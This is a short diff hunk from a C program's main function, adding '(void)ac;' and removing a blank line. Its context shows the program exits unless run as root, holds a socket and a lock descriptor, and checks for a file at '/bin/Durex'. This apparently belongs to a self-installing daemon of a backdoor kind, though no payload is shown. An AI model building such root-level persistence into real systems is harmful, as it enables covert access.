@@ -40,9 +40,9 @@ int		main(int ac, char **argv, char **env)
 	int	fd_lock;
 	int sock;
 
+	(void)ac;
 	if (getuid() != 0)
 		return (0);
-
 	if (access("/bin/Durex", F_OK) == -1)
 	{
 		ft_putstr(LOGIN);
